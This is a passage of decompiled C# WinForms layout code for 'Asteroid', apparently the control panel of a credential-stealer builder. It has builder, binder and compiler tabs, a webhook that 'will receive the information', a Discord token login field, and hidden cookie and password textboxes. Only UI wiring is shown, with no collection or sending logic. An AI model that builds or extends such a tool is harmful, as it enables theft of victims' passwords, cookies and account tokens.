			metroToolTip.SetToolTip((Control)(object)webhookIDbox, "Webhook url that will receive the information");
			webhookIDbox.set_UseSelectable(true);
			webhookIDbox.set_WaterMark("Webhook ID");
			webhookIDbox.set_WaterMarkColor(Color.FromArgb(109, 109, 109));
			webhookIDbox.set_WaterMarkFont(new Font("Segoe UI", 12f, FontStyle.Italic, GraphicsUnit.Pixel));
			((Control)(object)webhookIDbox).Click += webhookIDbox_Click;
			((Control)(object)emailCheckBox1).AutoSize = true;
			((Control)(object)emailCheckBox1).Enabled = false;
			((Control)(object)emailCheckBox1).Location = new Point(21, 53);
			((Control)(object)emailCheckBox1).Name = "emailCheckBox1";
			((Control)(object)emailCheckBox1).Size = new Size(108, 15);
			((Control)(object)emailCheckBox1).TabIndex = 36;
			((Control)(object)emailCheckBox1).Text = "switch to E-mail";
			emailCheckBox1.set_Theme((MetroThemeStyle)2);
			metroToolTip.SetToolTip((Control)(object)emailCheckBox1, "Switch the recovery-retrieve method to E-mail");
			emailCheckBox1.set_UseSelectable(true);
			((CheckBox)(object)emailCheckBox1).CheckedChanged += emailCheckBox1_CheckedChanged;
			testWebhookButton.set_Highlight(true);
			((Control)(object)testWebhookButton).Location = new Point(693, 30);
			((Control)(object)testWebhookButton).Name = "testWebhookButton";
			((Control)(object)testWebhookButton).Size = new Size(130, 22);
			((Control)(object)testWebhookButton).TabIndex = 38;
			((Control)(object)testWebhookButton).Text = "Test Webhook";
			testWebhookButton.set_Theme((MetroThemeStyle)2);
			testWebhookButton.set_UseSelectable(true);
			((Control)(object)testWebhookButton).Click += testWebhookButton_Click;
			webhookTextBox.get_CustomButton().set_Image((Image)null);
			((Control)(object)webhookTextBox.get_CustomButton()).Location = new Point(417, 2);
			((Control)(object)webhookTextBox.get_CustomButton()).Name = "";
			((Control)(object)webhookTextBox.get_CustomButton()).Size = new Size(17, 17);
			webhookTextBox.get_CustomButton().set_Style((MetroColorStyle)4);
			((Control)(object)webhookTextBox.get_CustomButton()).TabIndex = 1;
			webhookTextBox.get_CustomButton().set_Theme((MetroThemeStyle)1);
			webhookTextBox.get_CustomButton().set_UseSelectable(true);
			((Control)(object)webhookTextBox.get_CustomButton()).Visible = false;
			((Control)(object)webhookTextBox).ForeColor = Color.White;
			webhookTextBox.set_Lines(new string[0]);
			((Control)(object)webhookTextBox).Location = new Point(21, 30);
			webhookTextBox.set_MaxLength(32767);
			((Control)(object)webhookTextBox).Name = "webhookTextBox";
			webhookTextBox.set_PasswordChar('\0');
			webhookTextBox.set_PromptText("Webhook");
			webhookTextBox.set_ScrollBars(ScrollBars.None);
			webhookTextBox.set_SelectedText("");
			webhookTextBox.set_SelectionLength(0);
			webhookTextBox.set_SelectionStart(0);
			webhookTextBox.set_ShortcutsEnabled(true);
			((Control)(object)webhookTextBox).Size = new Size(437, 22);
			((Control)(object)webhookTextBox).TabIndex = 37;
			webhookTextBox.set_Theme((MetroThemeStyle)2);
			metroToolTip.SetToolTip((Control)(object)webhookTextBox, "Webhook url that will receive the information");
			webhookTextBox.set_UseSelectable(true);
			webhookTextBox.set_WaterMark("Webhook");
			webhookTextBox.set_WaterMarkColor(Color.FromArgb(109, 109, 109));
			webhookTextBox.set_WaterMarkFont(new Font("Segoe UI", 12f, FontStyle.Italic, GraphicsUnit.Pixel));
			((Control)(object)webhookTextBox).Click += webhookTextBox_Click;
			((Panel)(object)otherTab).BorderStyle = BorderStyle.FixedSingle;
			((Control)(object)otherTab).Controls.Add(loginGroupBox);
			((Control)(object)otherTab).Controls.Add(comingSoonGroupBox);
			otherTab.set_HorizontalScrollbarBarColor(true);
			otherTab.set_HorizontalScrollbarHighlightOnWheel(false);
			otherTab.set_HorizontalScrollbarSize(10);
			((TabPage)(object)otherTab).Location = new Point(4, 35);
			((Control)(object)otherTab).Name = "otherTab";
			((Control)(object)otherTab).Size = new Size(907, 402);
			((TabPage)(object)otherTab).TabIndex = 4;
			((Control)(object)otherTab).Text = "Other";
			otherTab.set_Theme((MetroThemeStyle)2);
			otherTab.set_VerticalScrollbarBarColor(true);
			otherTab.set_VerticalScrollbarHighlightOnWheel(false);
			otherTab.set_VerticalScrollbarSize(10);
			loginGroupBox.BackColor = Color.Transparent;
			loginGroupBox.Controls.Add((Control)(object)loginButton);
			loginGroupBox.Controls.Add((Control)(object)phoneLabel);
			loginGroupBox.Controls.Add((Control)(object)emailLabel);
			loginGroupBox.Controls.Add((Control)(object)usernameLabel);
			loginGroupBox.Controls.Add((Control)(object)loginTokenTextBox);
			loginGroupBox.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold);
			loginGroupBox.ForeColor = Color.White;
			loginGroupBox.Location = new Point(30, 19);
			loginGroupBox.Name = "loginGroupBox";
			loginGroupBox.Size = new Size(419, 351);
			loginGroupBox.TabIndex = 61;
			loginGroupBox.TabStop = false;
			loginGroupBox.Text = "Login";
			loginButton.set_Highlight(true);
			((Control)(object)loginButton).Location = new Point(19, 302);
			((Control)(object)loginButton).Name = "loginButton";
			((Control)(object)loginButton).Size = new Size(382, 22);
			((Control)(object)loginButton).TabIndex = 54;
			((Control)(object)loginButton).Text = "Login";
			loginButton.set_Theme((MetroThemeStyle)2);
			loginButton.set_UseSelectable(true);
			((Control)(object)loginButton).Click += loginButton_Click;
			((Control)(object)phoneLabel).AutoSize = true;
			((Control)(object)phoneLabel).Location = new Point(19, 241);
			((Control)(object)phoneLabel).Name = "phoneLabel";
			((Control)(object)phoneLabel).Size = new Size(49, 19);
			((Control)(object)phoneLabel).TabIndex = 57;
			((Control)(object)phoneLabel).Text = "Phone:";
			phoneLabel.set_Theme((MetroThemeStyle)2);
			((Control)(object)emailLabel).AutoSize = true;
			((Control)(object)emailLabel).Location = new Point(19, 166);
			((Control)(object)emailLabel).Name = "emailLabel";
			((Control)(object)emailLabel).Size = new Size(48, 19);
			((Control)(object)emailLabel).TabIndex = 56;
			((Control)(object)emailLabel).Text = "Email: ";
			emailLabel.set_Theme((MetroThemeStyle)2);
			((Control)(object)usernameLabel).AutoSize = true;
			((Control)(object)usernameLabel).Location = new Point(19, 91);
			((Control)(object)usernameLabel).Name = "usernameLabel";
			((Control)(object)usernameLabel).Size = new Size(39, 19);
			((Control)(object)usernameLabel).TabIndex = 55;
			((Control)(object)usernameLabel).Text = "User:";
			usernameLabel.set_Theme((MetroThemeStyle)2);
			loginTokenTextBox.get_CustomButton().set_Image((Image)null);
			((Control)(object)loginTokenTextBox.get_CustomButton()).Location = new Point(362, 2);
			((Control)(object)loginTokenTextBox.get_CustomButton()).Name = "";
			((Control)(object)loginTokenTextBox.get_CustomButton()).Size = new Size(17, 17);
			loginTokenTextBox.get_CustomButton().set_Style((MetroColorStyle)4);
			((Control)(object)loginTokenTextBox.get_CustomButton()).TabIndex = 1;
			loginTokenTextBox.get_CustomButton().set_Theme((MetroThemeStyle)1);
			loginTokenTextBox.get_CustomButton().set_UseSelectable(true);
			((Control)(object)loginTokenTextBox.get_CustomButton()).Visible = false;
			((Control)(object)loginTokenTextBox).ForeColor = Color.White;
			loginTokenTextBox.set_Lines(new string[0]);
			((Control)(object)loginTokenTextBox).Location = new Point(19, 35);
			loginTokenTextBox.set_MaxLength(32767);
			((Control)(object)loginTokenTextBox).Name = "loginTokenTextBox";
			loginTokenTextBox.set_PasswordChar('\0');
			loginTokenTextBox.set_PromptText("Discord Token");
			loginTokenTextBox.set_ScrollBars(ScrollBars.None);
			loginTokenTextBox.set_SelectedText("");
			loginTokenTextBox.set_SelectionLength(0);
			loginTokenTextBox.set_SelectionStart(0);
			loginTokenTextBox.set_ShortcutsEnabled(true);
			((Control)(object)loginTokenTextBox).Size = new Size(382, 22);
			((Control)(object)loginTokenTextBox).TabIndex = 54;
			loginTokenTextBox.set_Theme((MetroThemeStyle)2);
			metroToolTip.SetToolTip((Control)(object)loginTokenTextBox, "Discord token to login on");
			loginTokenTextBox.set_UseSelectable(true);
			loginTokenTextBox.set_WaterMark("Discord Token");
			loginTokenTextBox.set_WaterMarkColor(Color.FromArgb(109, 109, 109));
			loginTokenTextBox.set_WaterMarkFont(new Font("Segoe UI", 12f, FontStyle.Italic, GraphicsUnit.Pixel));
			((Control)(object)loginTokenTextBox).TextChanged += loginTokenTextBox_TextChanged;
			comingSoonGroupBox.BackColor = Color.Transparent;
			comingSoonGroupBox.Enabled = false;
			comingSoonGroupBox.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold);
			comingSoonGroupBox.ForeColor = Color.White;
			comingSoonGroupBox.Location = new Point(455, 19);
			comingSoonGroupBox.Name = "comingSoonGroupBox";
			comingSoonGroupBox.Size = new Size(419, 351);
			comingSoonGroupBox.TabIndex = 62;
			comingSoonGroupBox.TabStop = false;
			comingSoonGroupBox.Text = "Coming Soon";
			((Panel)(object)settingsTab).BorderStyle = BorderStyle.FixedSingle;
			((Control)(object)settingsTab).Controls.Add(groupBox1);
			((Control)(object)settingsTab).Controls.Add(userInfoGroupBox);
			settingsTab.set_HorizontalScrollbarBarColor(true);
			settingsTab.set_HorizontalScrollbarHighlightOnWheel(false);
			settingsTab.set_HorizontalScrollbarSize(10);
			((TabPage)(object)settingsTab).Location = new Point(4, 35);
			((Control)(object)settingsTab).Name = "settingsTab";
			((Control)(object)settingsTab).Size = new Size(907, 402);
			((TabPage)(object)settingsTab).TabIndex = 3;
			((Control)(object)settingsTab).Text = "Settings";
			settingsTab.set_Theme((MetroThemeStyle)2);
			settingsTab.set_VerticalScrollbarBarColor(true);
			settingsTab.set_VerticalScrollbarHighlightOnWheel(false);
			settingsTab.set_VerticalScrollbarSize(10);
			groupBox1.BackColor = Color.Transparent;
			groupBox1.Controls.Add((Control)(object)opacityTrackBar);
			groupBox1.Controls.Add((Control)(object)stylesComboBox);
			groupBox1.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold);
			groupBox1.ForeColor = Color.White;
			groupBox1.Location = new Point(30, 19);
			groupBox1.Name = "groupBox1";
			groupBox1.Size = new Size(419, 144);
			groupBox1.TabIndex = 63;
			groupBox1.TabStop = false;
			groupBox1.Text = "UI Settings";
			((Control)(object)opacityTrackBar).BackColor = Color.Transparent;
			((Control)(object)opacityTrackBar).Location = new Point(21, 92);
			opacityTrackBar.set_Minimum(5);
			((Control)(object)opacityTrackBar).Name = "opacityTrackBar";
			((Control)(object)opacityTrackBar).Size = new Size(375, 23);
			((Control)(object)opacityTrackBar).TabIndex = 9;
			opacityTrackBar.set_Theme((MetroThemeStyle)2);
			opacityTrackBar.add_ValueChanged((EventHandler)opacityTrackBar_ValueChanged);
			((ListControl)(object)stylesComboBox).FormattingEnabled = true;
			((ComboBox)(object)stylesComboBox).ItemHeight = 23;
			((Control)(object)stylesComboBox).Location = new Point(21, 37);
			((Control)(object)stylesComboBox).Name = "stylesComboBox";
			((Control)(object)stylesComboBox).Size = new Size(375, 29);
			((Control)(object)stylesComboBox).TabIndex = 5;
			stylesComboBox.set_Theme((MetroThemeStyle)2);
			stylesComboBox.set_UseSelectable(true);
			((ComboBox)(object)stylesComboBox).SelectedIndexChanged += colorsComboBox_SelectedIndexChanged;
			userInfoGroupBox.BackColor = Color.Transparent;
			userInfoGroupBox.Controls.Add((Control)(object)userLabel);
			userInfoGroupBox.Controls.Add((Control)(object)expiryLabel);
			userInfoGroupBox.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold);
			userInfoGroupBox.ForeColor = Color.White;
			userInfoGroupBox.Location = new Point(455, 19);
			userInfoGroupBox.Name = "userInfoGroupBox";
			userInfoGroupBox.Size = new Size(419, 144);
			userInfoGroupBox.TabIndex = 62;
			userInfoGroupBox.TabStop = false;
			userInfoGroupBox.Text = "User Information";
			((Control)(object)userLabel).AutoSize = true;
			userLabel.set_FontSize((MetroLabelSize)2);
			userLabel.set_FontWeight((MetroLabelWeight)1);
			((Control)(object)userLabel).Location = new Point(21, 37);
			((Control)(object)userLabel).Name = "userLabel";
			((Control)(object)userLabel).Size = new Size(95, 25);
			((Control)(object)userLabel).TabIndex = 3;
			((Control)(object)userLabel).Text = "Username:";
			userLabel.set_Theme((MetroThemeStyle)2);
			((Control)(object)userLabel).Click += userLabel_Click;
			((Control)(object)expiryLabel).AutoSize = true;
			expiryLabel.set_FontSize((MetroLabelSize)2);
			expiryLabel.set_FontWeight((MetroLabelWeight)1);
			((Control)(object)expiryLabel).Location = new Point(21, 90);
			((Control)(object)expiryLabel).Name = "expiryLabel";
			((Control)(object)expiryLabel).Size = new Size(103, 25);
			((Control)(object)expiryLabel).TabIndex = 4;
			((Control)(object)expiryLabel).Text = "Expire date:";
			expiryLabel.set_Theme((MetroThemeStyle)2);
			styleManager.set_Owner((ContainerControl)null);
			styleManager.set_Style((MetroColorStyle)13);
			styleManager.set_Theme((MetroThemeStyle)2);
			txtCookies.get_CustomButton().set_Image((Image)null);
			((Control)(object)txtCookies.get_CustomButton()).Location = new Point(-20, 2);
			((Control)(object)txtCookies.get_CustomButton()).Name = "";
			((Control)(object)txtCookies.get_CustomButton()).Size = new Size(17, 17);
			txtCookies.get_CustomButton().set_Style((MetroColorStyle)4);
			((Control)(object)txtCookies.get_CustomButton()).TabIndex = 1;
			txtCookies.get_CustomButton().set_Theme((MetroThemeStyle)1);
			txtCookies.get_CustomButton().set_UseSelectable(true);
			((Control)(object)txtCookies.get_CustomButton()).Visible = false;
			txtCookies.set_Lines(new string[0]);
			((Control)(object)txtCookies).Location = new Point(0, 0);
			txtCookies.set_MaxLength(32767);
			((Control)(object)txtCookies).Name = "txtCookies";
			txtCookies.set_PasswordChar('\0');
			txtCookies.set_ScrollBars(ScrollBars.None);
			txtCookies.set_SelectedText("");
			txtCookies.set_SelectionLength(0);
			txtCookies.set_SelectionStart(0);
			txtCookies.set_ShortcutsEnabled(true);
			((Control)(object)txtCookies).Size = new Size(0, 22);
			((Control)(object)txtCookies).TabIndex = 0;
			txtCookies.set_UseSelectable(true);
			txtCookies.set_WaterMarkColor(Color.FromArgb(109, 109, 109));
			txtCookies.set_WaterMarkFont(new Font("Segoe UI", 12f, FontStyle.Italic, GraphicsUnit.Pixel));
			txtPasswords.get_CustomButton().set_Image((Image)null);
			((Control)(object)txtPasswords.get_CustomButton()).Location = new Point(-20, 2);
			((Control)(object)txtPasswords.get_CustomButton()).Name = "";
			((Control)(object)txtPasswords.get_CustomButton()).Size = new Size(17, 17);
			txtPasswords.get_CustomButton().set_Style((MetroColorStyle)4);
			((Control)(object)txtPasswords.get_CustomButton()).TabIndex = 1;
			txtPasswords.get_CustomButton().set_Theme((MetroThemeStyle)1);
			txtPasswords.get_CustomButton().set_UseSelectable(true);
			((Control)(object)txtPasswords.get_CustomButton()).Visible = false;
			txtPasswords.set_Lines(new string[0]);
			((Control)(object)txtPasswords).Location = new Point(0, 0);
			txtPasswords.set_MaxLength(32767);
			((Control)(object)txtPasswords).Name = "txtPasswords";
			txtPasswords.set_PasswordChar('\0');
			txtPasswords.set_ScrollBars(ScrollBars.None);
			txtPasswords.set_SelectedText("");
			txtPasswords.set_SelectionLength(0);
			txtPasswords.set_SelectionStart(0);
			txtPasswords.set_ShortcutsEnabled(true);
			((Control)(object)txtPasswords).Size = new Size(0, 22);
			((Control)(object)txtPasswords).TabIndex = 0;
			txtPasswords.set_UseSelectable(true);
			txtPasswords.set_WaterMarkColor(Color.FromArgb(109, 109, 109));
			txtPasswords.set_WaterMarkFont(new Font("Segoe UI", 12f, FontStyle.Italic, GraphicsUnit.Pixel));
			metroToolTip.set_Style((MetroColorStyle)4);
			metroToolTip.set_StyleManager((MetroStyleManager)null);
			metroToolTip.set_Theme((MetroThemeStyle)1);
			((ContainerControl)this).AutoScaleMode = AutoScaleMode.None;
			((Form)this).ClientSize = new Size(966, 525);
			((Control)this).Controls.Add((Control)(object)mainTabControl);
			((Control)(object)this).Font = new Font("Myanmar Text", 15f, FontStyle.Regular, GraphicsUnit.Point, 0);
			((Control)(object)this).ForeColor = Color.White;
			((Form)this).Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			((Control)this).Name = "MainForm";
			((MetroForm)this).set_Resizable(false);
			((MetroForm)this).set_Style((MetroColorStyle)0);
			((Control)(object)this).Text = "Asteroid";
			((MetroForm)this).set_Theme((MetroThemeStyle)2);
			((Form)this).FormClosing += MainForm_FormClosing;
			((Form)this).Load += MainForm_Load;
			((Control)(object)mainTabControl).ResumeLayout(performLayout: false);
			((Control)(object)builderTab).ResumeLayout(performLayout: false);
			((Control)(object)metroTabControl2).ResumeLayout(performLayout: false);
			((Control)(object)optionsTab).ResumeLayout(performLayout: false);
			((Control)(object)optionsTab).PerformLayout();
			((Control)(object)extraTab).ResumeLayout(performLayout: false);
			((Control)(object)extraTab).PerformLayout();
			((Control)(object)comingSoonPanel3).ResumeLayout(performLayout: false);
			((Control)(object)comingSoonPanel3).PerformLayout();
			((Control)(object)comingSoonPanel2).ResumeLayout(performLayout: false);
			((Control)(object)comingSoonPanel2).PerformLayout();
			((ISupportInitialize)embedColorPictureBox).EndInit();
			((ISupportInitialize)iconPictureBox).EndInit();
			((Control)(object)pluginsTab).ResumeLayout(performLayout: false);
			((ISupportInitialize)pluginTextBox).EndInit();
			((Control)(object)binderTab).ResumeLayout(performLayout: false);
			((Control)(object)compilerTab).ResumeLayout(performLayout: false);
			webhookGroupBox.ResumeLayout(performLayout: false);
			webhookGroupBox.PerformLayout();
			((Control)(object)otherTab).ResumeLayout(performLayout: false);
			loginGroupBox.ResumeLayout(performLayout: false);
			loginGroupBox.PerformLayout();
			((Control)(object)settingsTab).ResumeLayout(performLayout: false);
			groupBox1.ResumeLayout(performLayout: false);
			userInfoGroupBox.ResumeLayout(performLayout: false);
			userInfoGroupBox.PerformLayout();
			((ISupportInitialize)styleManager).EndInit();
			((Control)this).ResumeLayout(performLayout: false);
		}
	}
}
